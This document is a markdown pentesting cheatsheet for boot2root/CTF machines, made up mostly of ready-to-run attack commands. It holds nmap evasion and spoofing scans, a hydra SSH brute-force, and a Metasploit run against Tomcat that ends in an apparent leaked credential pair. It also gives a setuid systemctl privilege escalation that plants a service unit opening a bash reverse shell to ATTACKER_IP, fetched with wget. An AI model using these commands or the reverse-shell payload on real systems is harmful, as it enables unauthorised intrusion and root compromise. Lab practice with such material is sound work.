# Boot2Root Cheatsheet


## **Enumeration**

<details>
  <summary>
    
### Nmap Network Scanning

  </summary>

## Most Common Commands for Pentesters & Bug Hunters
- **Full Network Recon (Aggressive Scan with OS & Version Detection):**
  ```bash
  nmap -A -T4 192.168.1.1
  ```
- **Quick Scan of Most Common Ports:**
  ```bash
  nmap -F 192.168.1.1
  ```
- **Full Port Scan + Service Detection:**
  ```bash
  nmap -p- -sV 192.168.1.1
  ```
- **Detect Live Hosts in a Network:**
  ```bash
  nmap -sn 192.168.1.0/24
  ```
- **Scan for Vulnerabilities (NSE Scripts):**
  ```bash
  nmap --script vuln 192.168.1.1
  ```
- **Bypass Firewall & Stealth Scan:**
  ```bash
  nmap -sS -T3 -D RND:10 192.168.1.1
  ```

## Basic Scans
- **Scan a single target:**  
  `nmap 192.168.1.1`
- **Scan multiple targets:**  
  `nmap 192.168.1.1 192.168.1.2`
- **Scan an entire subnet:**  
  `nmap 192.168.1.0/24`
- **Scan from a file list:**  
  `nmap -iL targets.txt`
- **No ping scan (for firewalled hosts):**  
  `nmap -Pn 192.168.1.1`

## Port Scanning
- **Scan all 65,535 ports:**  
  `nmap -p- 192.168.1.1`
- **Scan specific ports:**  
  `nmap -p 22,80,443 192.168.1.1`
- **Scan a port range:**  
  `nmap -p 1-1000 192.168.1.1`
- **Scan top 1000 most common ports:**  
  `nmap --top-ports 1000 192.168.1.1`

## Scan Techniques
- **TCP SYN scan (stealthy, default for root):**  
  `nmap -sS 192.168.1.1`
- **TCP Connect scan (for non-root users):**  
  `nmap -sT 192.168.1.1`
- **UDP scan:**  
  `nmap -sU 192.168.1.1`
- **Aggressive scan (OS, versions, scripts, traceroute):**  
  `nmap -A 192.168.1.1`
- **Scan with OS detection:**  
  `nmap -O 192.168.1.1`

## Service & Version Detection
- **Detect running services & versions:**  
  `nmap -sV 192.168.1.1`
- **Aggressive version detection:**  
  `nmap -sV --version-intensity 5 192.168.1.1`

## Firewall Evasion & Stealth
- **Change scan timing (1-5, slow to fast):**  
  `nmap -T4 192.168.1.1`
- **Use decoys to hide real IP:**  
  `nmap -D RND:10 192.168.1.1`
- **Spoof source IP:**  
  `nmap -S 192.168.1.100 192.168.1.1`
- **Fragment packets to bypass filters:**  
  `nmap -f 192.168.1.1`
- **Use a custom MAC address:**  
  `nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1`

## Nmap Scripting Engine (NSE)
- **List available scripts:**  
  `nmap --script-help=default`
- **Scan for vulnerabilities:**  
  `nmap --script vuln 192.168.1.1`
- **Scan for common exploits:**  
  `nmap --script exploit 192.168.1.1`
- **Scan for web vulnerabilities:**  
  `nmap --script=http-vuln* 192.168.1.1`
- **Detect open directories:**  
  `nmap --script http-enum 192.168.1.1`

## Saving & Exporting Scan Results
- **Save results in normal text format:**  
  `nmap -oN scan.txt 192.168.1.1`
- **Save results in XML format:**  
  `nmap -oX scan.xml 192.168.1.1`
- **Save results in all formats:**  
  `nmap -oA scan_results 192.168.1.1`
- **View output in grep-friendly format:**  
  `nmap -oG scan.gnmap 192.168.1.1`

## Specialized Scans
- **Scan for live hosts only:**  
  `nmap -sn 192.168.1.0/24`
- **Detect SMB vulnerabilities:**  
  `nmap --script smb-vuln* -p 445 192.168.1.1`
- **Enumerate SNMP information:**  
  `nmap -sU -p 161 --script=snmp-info 192.168.1.1`
- **Brute-force FTP login:**  
  `nmap --script=ftp-brute -p 21 192.168.1.1`



</details>


### **Web Enumeration**
```bash
gobuster dir -e -u http://10.10.181.27 -w /home/iftx/Desktop/Room/wordlist/common.txt -x .php,.txt,.js,.html

subfinder -d [Target Domain]     # Find subdomains

amass enum -d [Target Domain]    # Active enumeration
```

### **Service Enumeration**
```bash
hydra -l user_ name -P /home/iftx/Desktop/Room/wordlist/rockyou.txt 10.10.181.27 ssh

```

## Metasploit

<details>
  <summary>
   Metasploit Exploitation (Ghostcat - CVE-2020-1938)

  </summary>

1. Launch Metasploit

 `msfconsole`

2. Search for AJP Exploits

   `msf6 > search ajp`
   
```
Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_jsp_upload_bypass  2020-02-24       excellent  Yes    Tomcat RCE via JSP Upload Bypass
```
3. Select and Configure the Exploit

   `msf6 > use 0 `
   

`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > show options`


```
Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s)
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host
```


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOSTS 10.10.228.82`


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RPORT 8009`


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run`


skyfuck:8730281lkjlkjdqlksalks


  
</details>

## Privilege Escalation

<details>
  <summary>
  Privilege Escalation via Misconfigured setuid Binary (systemctl)
    
  </summary>



## Exploit Steps

1. Find setuid binaries owned by root:

```bash
find / -user root -perm -4000 -print 2>/dev/null

```
If /bin/systemctl has setuid, it can be abused.

2. Create a malicious service (root.service):

```
ini
Copy
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

[Install]
WantedBy=multi-user.target

```

3. Host the service & transfer to target:
Start HTTP server:

```python -m http.server 80```
On target, download:


```wget http://ATTACKER_IP/root.service -O /tmp/root.service```

4. Enable & start the service:
```
systemctl enable /tmp/root.service  # Uses setuid to gain root
systemctl start root

```

5. Get root shell:
Attacker listens:

```
nc -lvnp PORT
```
Service executes reverse shell as root.

### Mitigation
Remove setuid from systemctl:


chmod u-s /bin/systemctl
Restrict service file creation in /tmp (use noexec)

Monitor for unusual service activations

</details>


